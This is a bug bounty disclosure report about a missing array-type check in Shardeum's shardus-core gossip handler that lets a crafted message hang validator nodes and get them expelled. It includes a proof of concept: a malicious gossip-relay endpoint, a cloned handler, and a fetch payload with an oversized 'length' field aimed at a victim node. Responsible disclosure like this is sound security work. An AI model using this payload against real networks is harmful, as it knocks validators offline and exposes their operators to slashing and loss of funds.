# A missing check for the type of a variable allows a maliciously crafted message to unexpectedly remove validators from the network

Submitted on Aug 2nd 2024 at 11:11:29 UTC by @infosec_us_team for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33941

Report type: Blockchain/DLT

Report severity: Critical

Target: https://github.com/shardeum/shardus-core/tree/dev

Impacts:
- Network not being able to confirm new transactions (total network shutdown)
- Direct loss of funds

## Description
## Brief/Intro

In this report, we demonstrate how missing a check that ensures a user-controlled input is of type Array, allows for an attacker to send a maliciously crafted gossip message that unexpectedly disconnects active nodes from the network. 

> Disconnecting nodes from the active set without allowing them to send or receive gossip messages during the process exposes them to a slashing mechanism, causing loss of funds to victim nodes.

An alternative attack vector is to disconnect all active nodes and any new node that joins the active set, except for malicious ones.

> Controlling all nodes in a cycle leads to a loss of funds by manipulating the outcome of any transaction.

## About The Attack Vector
> Before pointing out the vulnerable code, it is important to understand how the attack vector works and why. In this section, we explain it with easy-to-understand examples.

Take a look at the following javascript code:
```
// USER-CONTROLLED INPUT
let greetings = ["hi", "hey", "hello"]

// SERVER-SIDE CODE
for (let i = 0; i < greetings.length; i++) {

    if (greetings[i] === "hello") {
        // do something here...
    }

}
```

The variable `greetings` is user input and the developer is expecting the user to provide an array of greetings.

But *what can go wrong if we don't enforce the variable `greetings` to be of type array?*

A malicious user can supply an object instead of an array, containing a field `length` with a number big enough to brick any application that tries to loop that many times in a row:
```
// USER-CONTROLLED INPUT
let greetings = { "length": "10000000000000001" }

// SERVER-SIDE CODE
for (let i = 0; i < greetings.length; i++) {

    if (greetings[i] === "hello") {
        // do something here...
    }

}
```

Due to how math with large numbers works in Javascript, a length of "10000000000000001" is enough to cause an infinite loop and brick the application.

> In our report with ID `33745` we explain how the Javascript type "Number" loses precision when operating with large numbers such as `10000000000000000`, and how the result of adding `10000000000000000 + 1` in Javascript automatically rounds back to `10000000000000000` (stays the same), no matter how many times in a row you add +1 to it.
>
> For a quick test, open your browser console and send `10000000000000000 + 1`, you may expect the output to be `10000000000000001` but it will be `10000000000000000`.

## Vulnerability Details

The vulnerable function is the handler for the internal gossip route `repair_oos_accounts`.
> https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L336-L487

Its execution flow starts by looping from an array of **repairInstructions**, extracting an **accountID**, **txId**, **hash**, **accountData**, **targetNodeId** and **receipt2**, and finally processing those fields.

```
this.p2p.registerInternal(
  'repair_oos_accounts',
  async (
    payload: { repairInstructions: AccountRepairInstruction[] },
    respond: (arg0: boolean) => Promise<boolean>,
    _sender: unknown,
    _tracker: string,
    msgSize: number
  ) => {
    profilerInstance.scopedProfileSectionStart('repair_oos_accounts', false, msgSize)

    try {
      for (const repairInstruction of payload?.repairInstructions) {
        const { accountID, txId, hash, accountData, targetNodeId, receipt2 } = repairInstruction
```
> Code snippet from: https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L336-L349

The only field relevant to our report is `payload .repairInstructions  .receipt2  .appliedVote .account_id`which is expected to be an array, but is not enforced in the code with a check, allowing a malicious sender to pass a variable of any other type.

After running some validity checks on the rest of the fields - which we are not diving deep into because they are irrelevant for the exploit to work - the code loops using the `length` field of the `payload.repairInstructions.receipt2.appliedVote.account_id` variable.

```
for (let i = 0; i < receivedBestVote.account_id.length; i++) {

  if (receivedBestVote.account_id[i] === accountID) {

      // SOME CODE HERE

  }

}
```
> Code snippet from: https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L413-L422

When sending an object instead of an array, with a field `length` and the value `10000000000000001`, it loops infinitely until the execution bricks, the validator stops responding to other nodes and is quicked out of the network.

## Recommended fix

Validate the type of the variable `account_id` to ensure it is an array.

## Impact Details

- All other endpoints (HTTP and Gossips) of the victim node become unresponsive. Visiting or requesting any of them will timeout.

- The rest of the nodes start to timeout their requests to the victim node and report him as lost, which may lead to a slashing event for becoming unresponsive without gossiping anything to the rest of the network.

- The victim node is removed from the network.

- It can be exploited to remove specific nodes and force them to be slashed or to remove as many nodes as possible to attempt to take over the active validators set.




## Proof of Concept

Download locally Shardus Core repo and Shardeum's repo locally.

Apply the following patch to the Shardeum repo:
```
git apply debug-10-nodes.patch
```

Now point Shardeum to use the local copy of Shardu's Core as instructed in the README.md file of Shardeum's codebase.

In your local copy of Shardeum, open the file `./src/index.ts` and add the following function in line L1094  (https://github.com/shardeum/shardeum/blob/dev/src/index.ts#L1094)
```
  shardus.registerExternalPost('infosec_gossipAnything/', externalApiMiddleware, async (req, res) => {
    try {
      const obj = JSON.parse(JSON.stringify(req.body));

      const route = req.query.route as string;

      const pk = req.query.pk as string;
      let node = shardus.getNodeByPubKey(pk);

      console.log(`INFOSEC: sending to node: ${JSON.stringify({ node })}`);
      await shardus.p2p.tell([node], route, obj, true, '')

      return res.json({ "ok": 1 });
    } catch (e) {
      return res.json({ "error": e });
    }
  });
```

The code snippet above creates an HTTP POST entry point that allows us to instruct a malicious node to gossip any message using any desired route to another node.

In your local copy of Shardus Core, open the file `./src/state-manager/AccountPatcher.ts` and add the following function in line L335  (https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L335)

```

        msgSize: number
      ) => {
        profilerInstance.scopedProfileSectionStart('repair_oos_accounts', false, msgSize)

        try {
          for (const repairInstruction of payload?.repairInstructions) {

      }
    )
```

The code snippet above does the following:

**1-** It creates a copy of the internal gossip handler `repair_oos_accounts` and names it `infosec_repair_oos_accounts`.

**2-** The `account_id` is the only value we'll tamper with. The rest of the fields in the payload will be untampered (valid values, that a legit request would send). Therefore, we make the proof of concept way easier to setup and reproduce by creating a new gossip handler and commenting checks for fields that will not be tampered with, but leaving uncommented all code that touches the vulnerable field.

Now build both codebases, and start the network with 10 nodes using shardus's CLI (`shardus start 10`)

Wait until cycle 16 before proceeding with the next step. All nodes should be active and synced by cycle 16.

> You can check the current cycle number in the network monitor: http://SERVER_IP:3000

After cycle 16, visit: http://SERVER_IP:4000/nodelist and copy the public key of the node running at port 9003. He will be our victim.

Now, visit: http://SERVER_IP:9005/, the node running at port 9005 will be the malicious one.

Open the browser console, and send the following request, after modifying the placeholders `SERVER_IP` and `VICTIM_PUBLIC_KEY `:

```
fetch("http://SERVER_IP:9005/infosec_gossipAnything/?route=infosec_repair_oos_accounts&pk=VICTIM_PUBLIC_KEY", {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        "repairInstructions": [{
            "accountID": "placeholder",
            "txId": "placeholder",
            "hash": "placeholder",
            "accountData": {},
            "targetNodeId": "placeholder",
            "receipt2": {
                "confirmOrChallenge": "placeholder",
                "appliedVote": {
                    "transaction_result": "placeholder",
                    "account_id": {
                        "length": "10000000000000000001"
                    }
                }
            }
        }]
    })
}).then(response => {
    if (!response.ok) {
        throw new Error('Network response was not ok');
    }
    return response.json();
}).then(data => {
    console.log('Success:', data);
}).catch(error => {
    console.error('Error:', error);
});
```

After sending the payload, you can try to visit http://SERVER_IP:VICTIM_PORT/ and it will not load.

At this point, the victim node is bricked. Other nodes will try to reach out to him using the **P2P: askBinary: network.askBinary: route: binary/compare_cert request** but they will get no response, leading to the victim's expulsion from the network.

This can be verified by going to the network monitor after waiting a couple of minutes http://SERVER_IP:3000, the victim node won't be there. If the network was started with 10 nodes, the total displayed in the dashboard will be 9.
